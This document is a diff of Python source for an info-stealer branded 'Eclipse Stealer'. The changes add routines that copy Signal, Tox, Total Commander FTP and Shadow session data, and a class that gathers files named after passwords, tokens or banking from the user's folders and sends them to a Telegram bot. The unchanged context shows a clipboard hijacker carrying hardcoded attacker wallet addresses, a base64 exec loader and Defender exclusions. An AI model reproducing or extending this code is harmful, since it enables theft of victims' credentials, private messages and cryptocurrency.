@@ -20,7 +20,9 @@ import json
 import hashlib
 import hmac
 import xml.etree.ElementTree as ET
+import zipfile
 
+from typing import List
 from urllib.request import Request, urlopen
 from pathlib import Path
 from ctypes import *
@@ -30,6 +32,7 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend # type: ignore
 from Crypto.Cipher import DES3, AES # type: ignore
 from Crypto.Protocol.KDF import PBKDF2 # type: ignore
+
 
 
 
@@ -1300,44 +1303,6 @@ class get_data:
         except Exception as Error:
             logs_handler(f"Error Stealing Wallets | {str(Error)}")
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
     async def DefenderExclusion(self) -> None:
         app_data_hidden_folder = os.path.join(self.localappdata, f".{''.join(random.choices(string.ascii_letters + string.digits, k=10))}")
         system_tasks_path = "C:\\Windows\\System32\\Tasks"
@@ -1352,8 +1317,6 @@ class get_data:
                 output = subprocess.check_output(command, shell=True)
             except subprocess.CalledProcessError:
                 pass
-
-        
 
     async def CryptoClipper(self) -> None:
         generate_random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
@@ -1410,16 +1373,17 @@ async def CryptoClipper() -> None:
                 except Exception:
                     return
 
+            # the clipper is not working (i'm working on it)
             blockchains = [
-                ("bc1qg76lq8455ugfmpse8fmdpcktq6v2c2ljnv6ra3", re.compile(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{{25,39}}$")),
-                ("LUYUXLnCk2Jp3xYZsqdkNoZ8Ujhohr15vs", re.compile(r"^(L|M|3)[a-km-zA-HJ-NP-Z1-9]{{26,33}}$")),
-                ("GAHEXTWXOEICVZPWIUFRUSJUNO6PBP2RLTHUBZIXVRBBSWPQ4E4OAGJI", re.compile(r"^G[0-9a-zA-Z]{{55}}$")),
-                ("r4D1EJW22VQm5fz6ZAFmWmWt6ppcx1t3z8", re.compile(r"^r[0-9a-zA-Z]{{24,34}}$")),
-                ("qqx7kkasdedvmp7q2nrd33y97y3u256kqvh0mvmtdr", re.compile(r"^(bitcoincash:)?(q|p)[a-z0-9]{{41}}$")),
-                ("0x44E1f6Aad473F85a3b7970A0E1df08d662CE8D3F", re.compile(r"^0x[a-fA-F0-9]{{40}}$")),
-                ("NEO_ADDRESS", re.compile(r"^A[0-9a-zA-Z]{{33}}$")),
-                ("XyN3rN7nWsmqzNR7imYh7poKN1se1g3kxm", re.compile(r"^X[1-9A-HJ-NP-Za-km-z]{{33}}$")),
-                ("D5x5um1hUJoDuEPhVVf54Uc6uTL4wdKVHr", re.compile(r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{{32}}$"))
+                ("bc1qg76lq8455ugfmpse8fmdpcktq6v2c2ljnv6ra3", re.compile(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{{25,39}}$")),  # BTC
+                ("LUYUXLnCk2Jp3xYZsqdkNoZ8Ujhohr15vs", re.compile(r"^(L|M|3)[a-km-zA-HJ-NP-Z1-9]{{26,33}}$")),  # LTC
+                ("GAHEXTWXOEICVZPWIUFRUSJUNO6PBP2RLTHUBZIXVRBBSWPQ4E4OAGJI", re.compile(r"^G[0-9a-zA-Z]{{55}}$")),  # Stellar
+                ("r4D1EJW22VQm5fz6ZAFmWmWt6ppcx1t3z8", re.compile(r"^r[0-9a-zA-Z]{{24,34}}$")),  # Ripple
+                ("qqx7kkasdedvmp7q2nrd33y97y3u256kqvh0mvmtdr", re.compile(r"^(bitcoincash:)?(q|p)[a-z0-9]{{41}}$")),  # BCH
+                ("0x44E1f6Aad473F85a3b7970A0E1df08d662CE8D3F", re.compile(r"^0x[a-fA-F0-9]{{40}}$")),  # ETH
+                ("NEO_ADDRESS", re.compile(r"^A[0-9a-zA-Z]{{33}}$")),  # NEO
+                ("XyN3rN7nWsmqzNR7imYh7poKN1se1g3kxm", re.compile(r"^X[1-9A-HJ-NP-Za-km-z]{{33}}$")),  # NeoGas
+                ("D5x5um1hUJoDuEPhVVf54Uc6uTL4wdKVHr", re.compile(r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{{32}}$"))  # Dash
             ]
 
             while True:
@@ -1444,9 +1408,9 @@ async def CryptoClipper() -> None:
                     await asyncio.sleep(1)
 
                 except Exception as Error:
-                    print(f"Error Launching Crypto Clipper!: {{str(Error)}}")
+                    pass
         except Exception as Error:
-            print(f"Error with Crypto Clipper: {{str(Error)}}")
+            pass
             
 asyncio.run(CryptoClipper())
 """
@@ -1457,11 +1421,9 @@ import base64
 import asyncio
 
 async def main():
-    # Décoder et exécuter le code
     code = base64.b64decode("{encoded_code}").decode('utf-8')
     exec(code)
 
-# Lancer le code avec asyncio
 asyncio.run(main())
 """
 
@@ -1482,44 +1444,6 @@ asyncio.run(main())
             subprocess.Popen([pythonw_exe, script_file_path], close_fds=True)
         except Exception as e:
             pass
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
     async def InjectWallets(self) -> None:
         async def inject(app_path, asar_path, injection_url, license_path=None):
@@ -1683,20 +1607,37 @@ asyncio.run(main())
             logs_handler(f"[ERROR] - getting Skype files: {str(Error)}")
             pass
 
+
     async def StealSignal(self, directory_path: str) -> None:
         try:
             signal_path = os.path.join(self.appdata, 'Signal')
             copied_path = os.path.join(directory_path, "Messenger", "Signal")
             if os.path.isdir(signal_path):
                 if not os.path.exists(copied_path):
-                    os.mkdir(copied_path)
+                    os.makedirs(copied_path)
+                
                 try:
-                    if os.path.exists(Path(signal_path) / "sql"):shutil.copytree(Path(signal_path) / "sql", os.path.join(copied_path, "sql"))
-                    elif os.path.exists(Path(signal_path) / "attachments.noindex"):shutil.copytree(Path(signal_path) / "attachments.noindex", os.path.join(copied_path, "attachments.noindex"))
-                    elif os.path.exists(Path(signal_path) / "config.json"):shutil.copy(Path(signal_path) / "config.json", copied_path)
+                    items_to_copy = [
+                        ("sql", "sql"),
+                        ("attachments.noindex", "attachments.noindex"),
+                        ("config.json", "config.json"),
+                        ("Local Storage", "Local Storage"),
+                        ("Session Storage", "Session Storage"),
+                        ("databases", "databases")
+                    ]
+                    for item, target in items_to_copy:
+                        source_path = Path(signal_path) / item
+                        target_path = os.path.join(copied_path, target)
+                    if os.path.exists(source_path):
+                        if os.path.isdir(source_path):
+                            shutil.copytree(source_path, target_path)
+                        elif os.path.isfile(source_path):
+                            shutil.copy(source_path, target_path)
+
                 except Exception as Error:
                     logs_handler(f"[ERROR] - copying Signal files to logs: {str(Error)}")
                     pass
+                
                 if len(os.listdir(copied_path)) == 0:
                     os.rmdir(copied_path)
 
@@ -1780,26 +1721,43 @@ asyncio.run(main())
             logs_handler(f"[ERROR] - getting Pidgin files: {str(Error)}")
             pass
 
-    async def StealTox(self, directory_path: str) -> None:
+    async def StealTox(self, directory_path) -> None:
         try:
-            tox_folder = os.path.join(self.appdata, 'Tox')
-            if os.path.isdir(tox_folder):
+            tox_path = os.path.join(self.appdata, "tox")
+            
+            saves = []
+
+            if not os.path.exists(tox_path):
+                return
+
+            files = os.listdir(tox_path)
+
+            for file in files:
+                save_path = os.path.join(tox_path, file)
+
+                if file.endswith(".tox") or file.endswith(".ini") or file.endswith(".db"):
+                    saves.append(save_path)
+
+            if saves:
                 tox_session = os.path.join(directory_path, "Messenger", "Tox")
                 os.makedirs(tox_session, exist_ok=True)
-                for item in Path(tox_folder).iterdir():
+
+                for save in saves:
                     try:
-                        if item.is_dir():
-                            shutil.copytree(item, tox_session, dirs_exist_ok=True)
+                        if os.path.isdir(save):
+                            shutil.copytree(save, tox_session, dirs_exist_ok=True)
                         else:
-                            shutil.copy2(item, tox_session)
+                            shutil.copy2(save, tox_session)
                     except Exception as Error:
-                        logs_handler(f"[ERROR] - copying Tox files to logs: {str(Error)}")
+                        logs_handler(f"[ERROR] - copying Tox files: {str(Error)}")
+
                 if len(os.listdir(tox_session)) == 0:
                     os.rmdir(tox_session)
-        except Exception as Error:
-            logs_handler(f"[ERROR] - getting Tox files: {str(Error)}")
-            pass
 
+        except Exception as e:
+            logs_handler(f"[ERROR] - getting Tox files: {str(e)}")
+
+            
     async def StealProtonVPN(self, directory_path: str) -> None:
         try:
             protonvpn_folder = os.path.join(self.localappdata, 'ProtonVPN')
@@ -1980,6 +1938,29 @@ asyncio.run(main())
             logs_handler(f"[ERROR] - copying FileZilla files: {str(Error)}")
             pass
 
+    async def StealTotalCommander(self, directory_path):
+        try:
+            totalcommander_path = os.path.join(os.getenv("APPDATA"), "GHISLER")
+
+            if not os.path.exists(totalcommander_path):
+                return
+
+            wcx_ftp_path = os.path.join(totalcommander_path, "wcx_ftp.ini")
+            
+            if os.path.exists(wcx_ftp_path):
+                totalcommander_session = os.path.join(directory_path, "Clients", "TotalCommander")
+                os.makedirs(totalcommander_session, exist_ok=True)
+
+                try:
+                    shutil.copy2(wcx_ftp_path, totalcommander_session)
+                except Exception as Error:
+                    logs_handler(f"[ERROR] - copying Total Commander file: {str(Error)}")
+
+                if len(os.listdir(totalcommander_session)) == 0:
+                    os.rmdir(totalcommander_session)
+
+        except Exception as e:
+            logs_handler(f"[ERROR] - getting Total Commander files: {str(e)}")
 
     async def StealWinSCP(self, destination_path) -> None:
         try:
@@ -2389,6 +2370,43 @@ asyncio.run(main())
             logs_handler(f"[ERROR] - getting BattleNet files: {str(Error)}")
             pass
 
+
+    async def StealShadow(self, directory_path: str) -> None:
+        try:
+            shadow_path = os.path.join(self.appdata, 'shadow')
+            copied_path = os.path.join(directory_path, "Games", "Shadow")
+            
+            if os.path.isdir(shadow_path):
+                if not os.path.exists(copied_path):
+                    os.makedirs(copied_path)
+                
+                try:
+                    items_to_copy_shadow = [
+                        ("Local State", "Local State"),
+                        ("Local Storage", "Local Storage"),
+                        ("Session Storage", "Session Storage")
+                    ]
+                    
+                    for item, target in items_to_copy_shadow:
+                        source_path = Path(shadow_path) / item
+                        target_path = os.path.join(copied_path, target)
+
+                    if os.path.exists(source_path):
+                        if os.path.isdir(source_path):
+                            shutil.copytree(source_path, target_path)
+                        elif os.path.isfile(source_path):
+                            shutil.copy(source_path, target_path)                    
+                except Exception as Error:
+                    logs_handler(f"[ERROR] - copying Shadow files to logs: {str(Error)}")
+                    pass
+                
+                if len(os.listdir(copied_path)) == 0:
+                    os.rmdir(copied_path)
+
+        except Exception as Error:
+            logs_handler(f"[ERROR] - getting Shadow files: {str(Error)}")
+            pass
+
     async def InsideFolder(self) -> None:
         try:
             hostname = platform.node()
@@ -2539,6 +2557,7 @@ asyncio.run(main())
                 self.StealSurfsharkVPN(filePath),
                 self.StealNordVPN(filePath),
                 self.StealFileZilla(filePath),
+                self.StealTotalCommander(filePath),
                 self.StealWinSCP(filePath),
                 self.BackupMailbird(filePath),
                 self.BackupThunderbird(filePath),
@@ -2552,6 +2571,7 @@ asyncio.run(main())
                 self.StealRockstarGames(filePath),
                 self.StealElectronicArts(filePath),
                 self.StealBattleNet(filePath),
+                self.StealShadow(filePath),
             ]
             
             await asyncio.gather(*tasks)
@@ -2627,7 +2647,7 @@ asyncio.run(main())
                 else:
                     file_url = await UploadFiles.upload_file(filePath + ".zip")
                     if file_url is not None:
-                        text = f"<b>📥  <i><u>{platform.node().upper()} - Eclipse Stealer</u></i></b>\n\n<b>⛓️  File Link:</b> {file_url}"
+                        text = f"<b>📥  <i><u>{platform.node().upper()} - Eclipse Stealer</u></i></b>\n\n<b>⛓️  Stealed Data: <a href=\"{file_url}\">All Data Link</a></b>"
                         message_payload['text'] = text
                         async with session.post(send_message_url, data=message_payload) as response:
                             if response.status != 200:
@@ -2648,6 +2668,84 @@ asyncio.run(main())
 
         except Exception as Error:
             logs_handler(f"[ERROR] - sending all data: {str(Error)}")
+
+class StealFiles:
+    def __init__(self) -> None:
+        self.send_message_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        self.send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+
+    async def search_files(self, directory: str, keywords: List[str], extensions: List[str]) -> List[str]:
+        found_files = []
+        try:
+            for file in os.listdir(directory):
+                path = os.path.join(directory, file)
+                if os.path.isdir(path):
+                    continue
+                extension = os.path.splitext(file)[1].lower()
+                if extension in extensions and any(keyword.lower() in file.lower() for keyword in keywords):
+                    found_files.append(path)
+        except Exception:
+            pass
+        return found_files
+
+    def generate_random_name(self, length: int) -> str:
+        characters = string.ascii_letters + string.digits
+        return ''.join(random.choice(characters) for _ in range(length))
+
+    async def zip_and_delete_folder(self, source_folder: str) -> str:
+        destination_folder = os.path.join(os.path.dirname(source_folder), f"{self.generate_random_name(10)}_Keywords.zip")
+        try:
+            with zipfile.ZipFile(destination_folder, 'w', zipfile.ZIP_DEFLATED) as archive:
+                for root, _, files in os.walk(source_folder):
+                    for file in files:
+                        archive.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), source_folder))
+            shutil.rmtree(source_folder)
+            return destination_folder
+        except Exception:
+            pass
+            return ""
+
+    async def send_to_telegram(self, zip_path: str):
+        async with aiohttp.ClientSession() as session:
+            if os.path.getsize(zip_path) <= 20 * 1024 * 1024:
+                with open(zip_path, 'rb') as f:
+                    data = {
+                        'chat_id': CHAT_ID
+                    }
+
+
+                    form_data = aiohttp.FormData()
+                    form_data.add_field('document', f, filename=os.path.basename(zip_path))
+                    form_data.add_field('chat_id', CHAT_ID)
+                    async with session.post(self.send_document_url, data=form_data) as response:
+                        if response.status != 200:
+                            pass
+            else:
+                file_url = await UploadFiles.upload_file(zip_path)
+                message_text = (f"<b>📥  <i><u>{platform.node().upper()} - Eclipse Stealer</u></i></b>\n\n<b>⛓️  Sensitive Files Link: [Stealed Files]({file_url})</b>")
+                data = {'chat_id': CHAT_ID, 'text': message_text, 'parse_mode': 'HTML'}
+                async with session.post(self.send_message_url, data=data) as response:
+                    if response.status != 200:
+                        pass
+
+    async def check_sensitive_files(self):
+        search_extensions = [".txt", ".jpg", ".png", ".jpeg", ".sql", ".json", ".csv", ".docx", ".pdf"]
+        search_keywords = ["backup", "token", "password", "secret", "bank"]
+        search_directories = [os.path.join(os.getenv("USERPROFILE"), folder) for folder in ["Desktop", "Downloads", "Documents"]]
+        
+        random_folder_name = self.generate_random_name(20)
+        destination_folder = os.path.join(os.getenv('TEMP'), random_folder_name)
+        
+        os.makedirs(destination_folder, exist_ok=True)
+        for directory in search_directories:
+            found_files = await self.search_files(directory, search_keywords, search_extensions)
+            for file in found_files:
+                file_name = os.path.basename(file)
+                destination_path = os.path.join(destination_folder, self.generate_random_name(3) + "_" + file_name)
+                shutil.copy2(file, destination_path)
+
+        zip_path = await self.zip_and_delete_folder(destination_folder)
+        await self.send_to_telegram(zip_path)
 
 class UploadFiles:
     @staticmethod
@@ -2925,5 +3023,8 @@ if __name__ == '__main__':
 
         main = get_data()
         asyncio.run(main.RunAllFonctions())
+
+        files = StealFiles()
+        asyncio.run(files.check_sensitive_files())
     else:
         print("run only on windows operating system")
